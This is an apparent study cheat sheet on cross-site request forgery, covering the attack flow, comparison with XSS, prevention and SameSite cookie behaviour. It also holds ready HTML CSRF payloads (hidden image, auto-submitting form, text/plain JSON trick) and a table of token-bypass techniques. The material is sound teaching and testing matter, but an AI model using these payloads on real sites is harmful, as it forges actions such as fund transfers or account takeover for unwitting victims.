# Cross-Site Request Forgery (CSRF)

## What is CSRF?

CSRF tricks an authenticated user's browser into sending an unintended request to a web application where they're logged in. The server can't distinguish the forged request from a legitimate one because it carries the victim's cookies automatically.

---

## How It Works

```
1. Victim is logged into bank.com (has valid session cookie)
2. Victim visits attacker's page (evil.com)
3. evil.com loads a hidden request to bank.com/transfer?to=attacker&amount=1000
4. Victim's browser sends the request — including their bank.com cookie
5. bank.com processes the transfer as if the victim initiated it
```

---

## CSRF vs XSS

| | CSRF | XSS |
|---|---|---|
| Exploits | Trust the server has in user's browser | Trust user has in the server |
| Requires victim to be | Authenticated | Just visiting |
| Attacker reads response | No (blind) | Yes |
| Cookie needed | Yes (auto-sent) | Not necessarily |

---

## Basic HTML Exploit

### GET Request CSRF
```html
<!-- Auto-loads when page is visited -->
<img src="https://bank.com/transfer?to=attacker&amount=1000" style="display:none">
```

### POST Request CSRF
```html
<html>
  <body onload="document.forms[0].submit()">
    <form action="https://bank.com/transfer" method="POST">
      <input type="hidden" name="to" value="attacker">
      <input type="hidden" name="amount" value="1000">
    </form>
  </body>
</html>
```

### JSON POST (if Content-Type isn't strictly enforced)
```html
<form action="https://api.target.com/update" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","x":"' value='"}'>
</form>
```
Note: `enctype="text/plain"` is needed to avoid preflight. True `application/json` requires CORS preflight.

---

## CSRF Token Bypass Techniques

| Bypass | Description |
|---|---|
| Remove the token | Some servers only check if token is present, not valid |
| Use another user's token | Tokens not tied to sessions |
| Token in URL | Leaked via Referer header |
| Predictable token | Weak RNG, timestamp-based |
| CSRF via XSS | Use XSS to read CSRF token then forge request |
| Method override | `?_method=POST` or `X-HTTP-Method-Override` header |
| JSON CSRF | If server accepts both JSON and form-encoded |

### Same-Site Cookie Bypass
If cookies are `SameSite=Lax` (not `Strict`):
- Top-level navigation via GET requests still carries cookies
- Craft a link the victim clicks:
```html
<a href="https://target.com/action?param=value">Click me</a>
```

---

## Checking CSRF Protection

1. Identify state-changing actions (transfer, change email/password, delete)
2. Capture the request in Burp Suite
3. Check if there's a CSRF token
4. Try removing/modifying the token — does it still work?
5. Try replaying from a different session

---

## Impact

- Transfer funds
- Change email/password (account takeover)
- Delete data
- Add admin user
- Any state-changing action the victim can perform

---

## Prevention

- **Synchronizer Token Pattern** — unique, session-tied token in every form/request
- **Double Submit Cookie** — send token in both cookie and request body
- **SameSite Cookie attribute** — `Strict` or `Lax` prevents cross-site sending
- **Check Origin/Referer header** — reject if mismatch (partial protection)
- **Re-authentication** for sensitive actions (change password, transfer funds)
- **Custom request headers** (e.g., `X-Requested-With`) — simple requests can't set custom headers cross-origin

---

## SameSite Cookie Values

| Value | Behavior |
|---|---|
| `Strict` | Cookie never sent cross-site |
| `Lax` | Cookie sent on top-level navigation (clicks), not on sub-requests |
| `None` | Always sent (requires `Secure`) |

---

## Tools

- Burp Suite → "Generate CSRF PoC" (right-click request → Engagement tools)

---

## References

- [PortSwigger CSRF](https://portswigger.net/web-security/csrf)
- [OWASP CSRF](https://owasp.org/www-community/attacks/csrf)
- [PayloadsAllTheThings - CSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection)
